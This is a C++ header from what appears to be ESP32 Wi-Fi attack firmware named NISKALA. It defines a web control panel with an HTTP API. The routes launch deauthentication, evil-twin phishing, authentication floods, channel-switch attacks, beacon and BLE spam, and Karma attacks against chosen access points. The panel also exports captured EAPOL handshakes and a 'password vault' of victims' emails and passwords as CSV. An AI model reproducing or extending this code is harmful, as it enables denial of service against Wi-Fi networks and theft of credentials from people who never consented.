#ifndef WEB_REMOTE_H
#define WEB_REMOTE_H

#include <WebServer.h>
#include <FS.h>
#include <LittleFS.h>
#include <WiFi.h>
#include <Preferences.h>
#include "attack_engine.h"
#include "web_utils.h"
#include "web_ui.h"
#include "packet_monitor.h"
#include "config_store.h"
#include "target_store.h"
#include "radio_manager.h"
#include "wifi_state.h"

extern WebServer server;
#if __has_include("secrets.h")
  #include "secrets.h"
#endif
#ifndef NISKALA_WEB_PASS
  #define NISKALA_WEB_PASS ""
#endif
#define WEB_PASS NISKALA_WEB_PASS
extern unsigned long g_webAuthFailCount;
extern unsigned long g_webAuthLockUntil;

inline bool webAuthOK() {
  if (WEB_PASS[0] == '\0') return true;
  if (millis() < g_webAuthLockUntil) return false; // terkunci sementara (brute-force)
  bool ok = server.hasHeader("X-NISKALA-TOKEN") && server.header("X-NISKALA-TOKEN") == String(WEB_PASS);
  if (!ok) {
    g_webAuthFailCount++;
    if (g_webAuthFailCount >= 10) {
      g_webAuthLockUntil = millis() + 60000UL; // 60 detik lockout
      g_webAuthFailCount = 0;
      Serial.println("[WEB] Too many auth failures, locked 60s");
    }
  } else {
    g_webAuthFailCount = 0;
  }
  return ok;
}
// CSRF/origin check: tolak request lintas-origin bila header Origin/Referer ada.
inline bool webOriginOK() {
  String origin = server.hasHeader("Origin") ? server.header("Origin") : "";
  if (origin.length() == 0) origin = server.hasHeader("Referer") ? server.header("Referer") : "";
  if (origin.length() == 0) return true; // klien non-browser / tanpa header
  origin.toLowerCase();
  return origin.indexOf("192.168.4.1") >= 0 || origin.indexOf("niskala_ctrl") >= 0;
}
#define REQUIRE_WEB_AUTH() if (!webAuthOK() || !webOriginOK()) { server.send(403, "text/plain", "Forbidden"); return; }
#define REQUIRE_WEB_MODE() if (!isWebRemoteRunning) { server.send(404, "text/plain", "Web Remote off"); return; }
extern State currentState;
extern void startDeauthEngine();
extern void startBeaconSpam();
extern void startGlobalDeauth();
extern void startProbeSniffer();
extern void startBTSpam();
extern void startEvilTwinWithDeauth();
extern void startAuthFlood();
extern void startCSAAttack();
extern void startKarmaScan();
extern void startWebRemote();
extern void stopWebRemote();
extern bool isWebRemoteRunning;
extern int selectedTemplateIdx;
extern int verifyAttempts;
extern int verifyState;
extern void stopAllAttacks();
extern void stopAttacksKeepWebRemote();
extern uint8_t g_targetBSSID[6];
extern volatile uint8_t g_targetChannel;
extern volatile uint32_t g_packetsSent;
extern volatile uint32_t g_txErrors;
extern String targetSSID;
extern Preferences prefs;
extern int cfg_deauth_burst;
extern int cfg_deauth_reason;
extern int cfg_auth_burst;
extern int cfg_hop_interval_ms;
extern int cfg_beacon_hop_ms;
extern void saveConfig();
extern String cfg_wifi_ssid;
extern String cfg_wifi_pass;
extern String cfg_server_url;
extern int cfg_autosync_min;
extern int readBatteryPercent();
extern TaskHandle_t attackTaskHandle;
extern String cfg_template_url;
extern String buildEapolJson();
extern String buildTelemetryJson();
extern String dumpEventLog();
extern String buildSyncJson();
extern String buildBleJson();
extern bool g_bleScanning;
extern void startBLEScan();
extern bool isEapolRunning;
extern bool g_evilTwinCoop;
extern bool detectPMFByBssid(const uint8_t* bssid, uint8_t channel, bool* found);
extern volatile bool g_pmfChecked;
extern volatile bool g_pmfResult;
extern volatile bool g_pmfFoundFlag;
extern bool g_pmfShowResult;
extern unsigned long g_pmfShowUntil;
void drawPmfResultScreen(bool pmf, bool found);

inline String wifiAuthName(int auth) {
  switch (auth) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-EAP";
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/WPA3";
    case WIFI_AUTH_WPA3_ENT_192: return "WPA3-ENT";
    default: return "UNKNOWN";
  }
}

// HTML UI


// Sajikan UI utama dari LittleFS; fallback ke string firmware jika file belum ada.
inline void serveRemoteUI() {
  if (LittleFS.begin(false) || LittleFS.begin(true)) {
    if (LittleFS.exists("/index.html")) {
      fs::File f = LittleFS.open("/index.html", "r");
      if (f) {
        server.streamFile(f, "text/html");
        f.close();
        return;
      }
    }
  }
  server.send_P(200, "text/html", HTML_REMOTE_FALLBACK);
}

inline void setupWebRemote() {
  // Kumpulkan header yang dibaca oleh auth/CSRF check. Tanpa ini,
  // WebServer::header()/hasHeader() selalu kosong untuk header selain Authorization.
  static const char* WEB_HEADERS[] = { "Origin", "Referer", "X-NISKALA-TOKEN" };
  server.collectHeaders(WEB_HEADERS, sizeof(WEB_HEADERS) / sizeof(WEB_HEADERS[0]));

  // Halaman utama remote control
  server.on("/rc", []() {
    if (!isWebRemoteRunning) {
      server.sendHeader("Location", "/", true);
      server.send(302, "text/plain", "");
      return;
    }
    serveRemoteUI();
  });

  // Status live untuk UI
  server.on("/api/status", []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    String json = "{\"uptime\":" + String(millis() / 1000UL) +
                  ",\"heap\":" + String(ESP.getFreeHeap()) +
                  ",\"packets\":" + String((uint32_t)getPacketsSent()) +
                  ",\"txerrors\":" + String((uint32_t)getTxErrors()) +
                  ",\"mode\":" + String((int)currentState) +
                  ",\"battery\":" + String(readBatteryPercent()) +
                  ",\"temp\":" + String((int)temperatureRead()) +
                  ",\"stack\":" + String(attackTaskHandle ? (int)uxTaskGetStackHighWaterMark(attackTaskHandle) : 0) +
                  ",\"target\":\"" + jsonEscape(targetSSID) + "\"}";
    server.send(200, "application/json", json);
  });

  // Preset serangan
  server.on("/api/preset", HTTP_POST, []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    String name = server.hasArg("name") ? server.arg("name") : "";
    if (name.length() == 0) name = server.hasArg("plain") ? server.arg("plain") : "";
    if (applyAttackPreset(name)) {
      server.send(200, "text/plain", "Preset Applied");
    } else {
      server.send(400, "text/plain", "Unknown preset");
    }
  });

  // Daftar target tersimpan
  server.on("/api/targets", []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    targetStoreLoad();
    String j = "{\"targets\":[";
    for (int i = 0; i < g_savedTargetCount; i++) {
      if (i) j += ",";
      char mac[18];
      snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
               g_savedTargets[i].mac[0], g_savedTargets[i].mac[1], g_savedTargets[i].mac[2],
               g_savedTargets[i].mac[3], g_savedTargets[i].mac[4], g_savedTargets[i].mac[5]);
      j += "{\"name\":\"" + jsonEscape(String(g_savedTargets[i].name)) + "\",\"mac\":\"" + String(mac) + "\",\"ch\":" + String(g_savedTargets[i].channel) + "}";
    }
    j += "]}";
    server.send(200, "application/json", j);
  });

  // Tambah target tersimpan
  server.on("/api/targets", HTTP_POST, []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    String name = server.arg("name");
    String macStr = server.arg("mac");
    uint8_t mac[6];
    int values[6];
    int parsed = sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
                        &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]);
    if (name.length() == 0 || parsed != 6) {
      server.send(400, "text/plain", "Invalid name/mac");
      return;
    }
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)values[i];
    uint8_t ch = server.hasArg("ch") ? (uint8_t)server.arg("ch").toInt() : 1;
    if (targetAdd(name.c_str(), mac, ch)) server.send(200, "text/plain", "Target Added");
    else server.send(400, "text/plain", "Target full/invalid");
  });

  // Hapus target tersimpan
  server.on("/api/targets/delete", HTTP_POST, []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    int idx = server.hasArg("idx") ? server.arg("idx").toInt() : -1;
    if (targetDelete(idx)) server.send(200, "text/plain", "Target Deleted");
    else server.send(400, "text/plain", "Invalid index");
  });

  // Config attack (read)
  server.on("/api/config", HTTP_GET, []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    String json = "{\"deauth\":" + String(cfg_deauth_burst) +
                  ",\"auth\":" + String(cfg_auth_burst) +
                  ",\"hop\":" + String(cfg_hop_interval_ms) +
                  ",\"beacon\":" + String(cfg_beacon_hop_ms) +
                  ",\"reason\":" + String(cfg_deauth_reason) +
                  ",\"wifi\":\"" + jsonEscape(cfg_wifi_ssid) + "\"" +
                  ",\"wifipass\":\"" + jsonEscape(cfg_wifi_pass) + "\"" +
                  ",\"url\":\"" + jsonEscape(cfg_server_url) + "\"" +
                  ",\"tpl\":\"" + jsonEscape(cfg_template_url) + "\"" +
                  ",\"autosync\":" + String(cfg_autosync_min) + "}";
    server.send(200, "application/json", json);
  });

  // Config attack (save)
  server.on("/api/config", HTTP_POST, []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    if (server.hasArg("deauth")) cfg_deauth_burst = constrain(server.arg("deauth").toInt(), 1, 100);
    if (server.hasArg("auth"))   cfg_auth_burst = constrain(server.arg("auth").toInt(), 1, 200);
    if (server.hasArg("hop"))    cfg_hop_interval_ms = constrain(server.arg("hop").toInt(), 20, 2000);
    if (server.hasArg("beacon")) cfg_beacon_hop_ms = constrain(server.arg("beacon").toInt(), 20, 2000);
    if (server.hasArg("reason")) cfg_deauth_reason = constrain(server.arg("reason").toInt(), 0, 16);
    if (server.hasArg("wifi")) cfg_wifi_ssid = server.arg("wifi");
    if (server.hasArg("wifipass")) cfg_wifi_pass = server.arg("wifipass");
    if (server.hasArg("url")) cfg_server_url = server.arg("url");
    if (server.hasArg("tpl")) cfg_template_url = server.arg("tpl");
    if (server.hasArg("autosync")) cfg_autosync_min = constrain(server.arg("autosync").toInt(), 0, 1440);
    saveConfig();
    server.send(200, "text/plain", "Config Saved");
  });

  // Scan WiFi
  server.on("/api/scan", []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    esp_wifi_set_promiscuous(false);
    if (WiFi.getMode() != WIFI_AP_STA) radioSetMode(RADIO_AP_STA);
    WiFi.scanDelete();
    int n = WiFi.scanNetworks(false, true, false, 350, 0);
    if (n < 0) {
      server.send(200, "application/json", "[]");
      return;
    }
    String json = "[";
    for (int i = 0; i < n; i++) {
      if (i > 0) json += ",";
      int auth = (int)WiFi.encryptionType(i);
      json += "{\"mac\":\"" + jsonEscape(WiFi.BSSIDstr(i)) + "\",\"ssid\":\"" + jsonEscape(WiFi.SSID(i)) + "\",\"rssi\":" + String(WiFi.RSSI(i)) + ",\"ch\":" + String(WiFi.channel(i)) + ",\"auth\":" + String(auth) + ",\"enc\":\"" + wifiAuthName(auth) + "\"}";
    }
    WiFi.scanDelete();
    json += "]";
    server.send(200, "application/json", json);
  });

  // Mulai Deauth ke target
  server.on("/api/attack", []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    if (server.hasArg("mac") && server.hasArg("ch") && server.hasArg("ssid")) {
      String macStr = server.arg("mac");
      String ssid = server.arg("ssid");

      int values[6];
      int parsed = sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
             &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]);
      if (parsed != 6) {
        server.send(400, "text/plain", "Invalid MAC");
        return;
      }

      g_targetChannel = constrain(server.arg("ch").toInt(), 1, 14);
      targetSSID = ssid.substring(0, 32);
      for (int i = 0; i < 6; i++) g_targetBSSID[i] = (uint8_t)values[i];

      String mode = server.hasArg("mode") ? server.arg("mode") : "deauth";
      server.send(200, "text/plain", "Attack Started");

      if (mode == "evil") {
        stopAllAttacks();
        isWebRemoteRunning = false;
        selectedTemplateIdx = 0;
        verifyAttempts = 0;
        verifyState = 0;
        g_evilTwinCoop = false;
        currentState = EVIL_TWIN_RUNNING;
        startEvilTwinWithDeauth();
      } else {
        stopAllAttacks();
        isWebRemoteRunning = false;
        if (mode == "auth") {
          currentState = AUTH_FLOOD_RUNNING;
          startAuthFlood();
        } else if (mode == "csa") {
          currentState = CSA_RUNNING;
          startCSAAttack();
        } else {
          currentState = DEAUTH_MENU;
          startDeauthEngine();
        }
      }
    } else {
      server.send(400, "text/plain", "Bad Request");
    }
  });

  // Stop semua
  server.on("/api/stop", []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    stopAttacksKeepWebRemote();
    currentState = WEB_REMOTE;
    server.send(200, "text/plain", "Stopped");
  });

  // Quick start modul lain
  server.on("/api/start/beacon", []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    server.send(200, "text/plain", "Beacon Started - Web Remote disconnected");
    stopAllAttacks();
    isWebRemoteRunning = false;
    currentState = BEACON_SPAM;
    startBeaconSpam();
  });
  server.on("/api/start/global", []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    server.send(200, "text/plain", "Global Started - Web Remote disconnected");
    stopAllAttacks();
    isWebRemoteRunning = false;
    currentState = GLOBAL_DEAUTH;
    startGlobalDeauth();
  });
  server.on("/api/start/probe", []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    server.send(200, "text/plain", "Probe Started - Web Remote disconnected");
    stopAllAttacks();
    isWebRemoteRunning = false;
    currentState = PROBE_SNIFF;
    startProbeSniffer();
  });
  server.on("/api/start/ble", []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    server.send(200, "text/plain", "BLE Started - WiFi off, Web Remote disconnected");
    stopAllAttacks();
    isWebRemoteRunning = false;
    currentState = BT_SPAM;
    startBTSpam();
  });
  server.on("/api/start/karma", []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    server.send(200, "text/plain", "Karma Started - Web Remote disconnected");
    stopAllAttacks();
    isWebRemoteRunning = false;
    currentState = KARMA_SCAN;
    startKarmaScan();
  });

  server.on("/api/start/blescan", []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    server.send(200, "text/plain", "BLE Scan Started - WiFi off, Web Remote disconnected");
    stopAllAttacks();
    isWebRemoteRunning = false;
    currentState = BLE_SCAN;
    startBLEScan();
  });

  // Deteksi PMF (802.11w) presisi via beacon RSN
  server.on("/api/pmf", []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    if (!server.hasArg("mac") || !server.hasArg("ch")) {
      server.send(400, "application/json", "{\"ok\":false,\"msg\":\"missing args\"}");
      return;
    }
    String macStr = server.arg("mac");
    int values[6];
    int parsed = sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
                        &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]);
    if (parsed != 6) {
      server.send(400, "application/json", "{\"ok\":false,\"msg\":\"invalid mac\"}");
      return;
    }
    uint8_t mac[6];
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)values[i];
    uint8_t ch = constrain(server.arg("ch").toInt(), 1, 14);

    Serial.printf("[PMF] req mac=%s ch=%u ssid=%s\n", macStr.c_str(), ch, server.hasArg("ssid") ? server.arg("ssid").c_str() : "-");
    bool found = false;
    bool pmf = detectPMFByBssid(mac, ch, &found);
    Serial.printf("[PMF] result pmf=%d found=%d\n", (int)pmf, (int)found);

    if (server.hasArg("ssid")) targetSSID = server.arg("ssid").substring(0, 32);

    // Sniff memakai STA -> AP kontrol sempat turun; pulihkan kembali secepatnya.
    radioSetMode(RADIO_AP_STA);
    delay(80);
    restoreOriginalApMac();
    WiFi.softAP("NISKALA_CTRL", "niskala123", 1, 0, 4);
    delay(150);
    isWebRemoteRunning = true;

    g_pmfShowResult = true;
    g_pmfShowUntil = millis() + 5000;
    drawPmfResultScreen(pmf, found);

    server.send(200, "application/json",
      "{\"ok\":true,\"pmf\":" + String(pmf ? "true" : "false") +
      ",\"found\":" + String(found ? "true" : "false") + "}");
  });

  // Hasil deteksi PMF terakhir (untuk polling setelah AP sempat reset)
  server.on("/api/pmf-result", []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    server.send(200, "application/json",
      "{\"checked\":" + String(g_pmfChecked ? "true" : "false") +
      ",\"pmf\":" + String(g_pmfResult ? "true" : "false") +
      ",\"found\":" + String(g_pmfFoundFlag ? "true" : "false") + "}");
  });

  // BLE scan JSON
  server.on("/api/ble", []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    server.send(200, "application/json", buildBleJson());
  });

  // Telemetry lengkap
  server.on("/api/telemetry", []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    server.send(200, "application/json", buildTelemetryJson());
  });

  // Event log (observability)
  server.on("/api/log", []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    server.send(200, "text/plain", dumpEventLog());
  });

  // Packet monitor: deteksi deauth/disassoc di sekitar
  server.on("/api/pm", []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    server.send(200, "application/json", packetMonitorJson());
  });

  // EAPOL status/export
  server.on("/api/eapol", []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    server.send(200, "application/json", buildEapolJson());
  });

  // Export semua log sebagai JSON
  server.on("/api/export/logs.json", []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    server.send(200, "application/json", buildSyncJson());
  });

  // Export Probe Sniff CSV
  server.on("/api/export/probe", []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    String csv = "mac,rssi,ssid\r\n";
    portENTER_CRITICAL(&g_probeLogMux);
    int cnt = g_probeLogCount;
    int head = g_probeLogHead;
    ProbeEntry snap[PROBE_LOG_SIZE];
    for (int i = 0; i < cnt; i++) {
      int idx = (head - cnt + i + PROBE_LOG_SIZE) % PROBE_LOG_SIZE;
      snap[i] = g_probeLog[idx];
    }
    portEXIT_CRITICAL(&g_probeLogMux);
    for (int i = 0; i < cnt; i++) {
      char mac[18];
      snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
               snap[i].mac[0], snap[i].mac[1], snap[i].mac[2],
               snap[i].mac[3], snap[i].mac[4], snap[i].mac[5]);
      String ssid = snap[i].ssid[0] ? String(snap[i].ssid) : String("(hidden)");
      csv += String(mac) + "," + String(snap[i].rssi) + "," + csvField(ssid) + "\r\n";
    }
    server.sendHeader("Content-Disposition", "attachment; filename=probe.csv");
    server.send(200, "text/csv", csv);
  });

  // Export Karma CSV
  server.on("/api/export/karma", []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    String csv = "ssid,probe_count,auth_count\r\n";
    for (int i = 0; i < g_karmaSSIDCount; i++) {
      csv += csvField(String(g_karmaSSIDs[i].ssid)) + "," + String(g_karmaSSIDs[i].probeCount) + "," + String(g_karmaSSIDs[i].authCount) + "\r\n";
    }
    server.sendHeader("Content-Disposition", "attachment; filename=karma.csv");
    server.send(200, "text/csv", csv);
  });

  // Export Password Vault CSV
  server.on("/api/export/passwords", []() {
    REQUIRE_WEB_AUTH();
    REQUIRE_WEB_MODE();
    int total = prefs.getInt("pwd_count", 0);
    String csv = "email,password,verified\r\n";
    for (int i = 0; i < total; i++) {
      String entry = prefs.getString(("pwd_" + String(i)).c_str(), "");
      int p1 = entry.indexOf('|');
      String email = (p1 > 0) ? entry.substring(0, p1) : entry;
      String rest = (p1 > 0) ? entry.substring(p1 + 1) : "";
      int p2 = rest.indexOf('|');
      String pass = (p2 > 0) ? rest.substring(0, p2) : rest;
      String ver = (p2 > 0) ? rest.substring(p2 + 1) : "";
      csv += csvField(email) + "," + csvField(pass) + "," + ver + "\r\n";
    }
    server.sendHeader("Content-Disposition", "attachment; filename=passwords.csv");
    server.send(200, "text/csv", csv);
  });
}

#endif
